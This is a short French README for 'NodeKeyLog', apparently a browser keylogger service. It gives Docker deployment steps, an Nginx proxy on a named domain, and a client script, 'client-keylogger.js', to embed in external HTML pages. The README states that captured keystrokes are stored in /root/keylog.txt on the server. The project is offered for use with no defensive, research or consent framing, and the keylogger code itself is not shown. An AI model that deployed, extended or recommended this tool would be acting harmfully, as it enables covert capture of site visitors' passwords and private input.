# NodeKeyLog

## Prérequis
- Docker et Docker Compose installés sur le serveur Linux

## Déploiement rapide

1. **Cloner le projet**
```bash
git clone https://github.com/ton-utilisateur/NodeKeyLog.git
cd NodeKeyLog
```

2. **Lancer les conteneurs**
```bash
docker-compose up -d --build
```

3. **Vérifier**
- Le serveur Node.js écoute sur le port 3000 (interne)
- Nginx reverse proxy sur http://nodekey.skandy.online et http://www.nodekey.skandy.online
- Les touches sont enregistrées dans `/root/keylog.txt` sur le serveur

## Script client
Inclure le fichier `client-keylogger.js` dans ta page HTML externe.

---

**Remarque :**
- Pour HTTPS, il faudra ajouter une configuration supplémentaire (Let’s Encrypt, etc).
- Pour toute question ou amélioration, ouvre une issue ou contacte le mainteneur.
